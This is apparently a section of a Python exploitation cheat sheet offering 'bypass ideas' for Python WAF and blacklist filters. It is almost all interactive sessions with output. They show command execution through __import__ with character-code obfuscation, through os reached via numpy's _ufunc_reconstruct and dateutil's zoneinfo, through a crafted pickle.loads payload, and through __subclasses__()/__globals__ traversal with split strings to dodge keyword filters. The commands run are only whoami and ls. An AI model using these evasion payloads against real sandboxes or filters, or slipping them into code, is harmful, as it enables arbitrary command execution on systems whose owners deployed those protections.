## Using `__import__()` magic method

1. using `__import__()` method as alternative import way of any package or built-in library in python
```python
>>> __import__("sys").version
'3.5.2 (default, Nov 12 2018, 13:43:14) \n[GCC 5.4.0 20160609]'
```
then
```python
>>> ll = [119, 104, 111, 97, 109, 105]
>>> func1 = lambda ff: "".join([chr(z) for z in ff])
>>> __import__("os").system(func1(ll))
tarek
0
```

Some Bypass ideas under Python WAF blacklist filtering
```python
>>> from numpy.core import * 
>>> _ufunc_reconstruct("os","system")("whoami")
tarek
0
>>> from dateutil import zoneinfo
>>> zoneinfo.os.system("ls /")
bin  boot  cdrom  core	data  dead.letter  dev  etc  home  initrd.img  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var  vmlinuz
0
>>> import pickle
>>> pickle.loads(b"cos\nsystem\n(S'ls'\ntR.")
Documents  Pictures  Templates  Videos  Desktop  Downloads  Music  Public
0
>>> j = [].__class__.__base__.__subclasses__()[68].__init__.__globals__['o'+'s'].__dict__['s'+'y'+'s'+'t'+'e'+'m']
>>> j("ls /")
bin  boot  cdrom  core	data  dead.letter  dev  etc  home  initrd.img  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var  vmlinuz
0
>>> [].__class__.__base__.__subclasses__()[68].__init__.__globals__.keys()
dict_keys(['__spec__', '__loader__', '_PopenSelector', '__package__', '__file__', 'PIPE', '__cached__', '_mswindows', '__builtins__', 'STDOUT', 'call', '__all__', '__doc__', '_PLATFORM_DEFAULT_CLOSE_FDS', 'list2cmdline', '_time', 'os', 'time', 'sys', 'getstatusoutput', 'run', 'Popen', 'io', 'warnings', 'CompletedProcess', 'check_call', 'getoutput', '_posixsubprocess', 'threading', 'errno', '_PIPE_BUF', 'signal', 'TimeoutExpired', 'DEVNULL', 'check_output', 'SubprocessError', '_cleanup', 'builtins', '__name__', '_args_from_interpreter_flags', '_active', 'selectors', 'select', 'CalledProcessError'])
```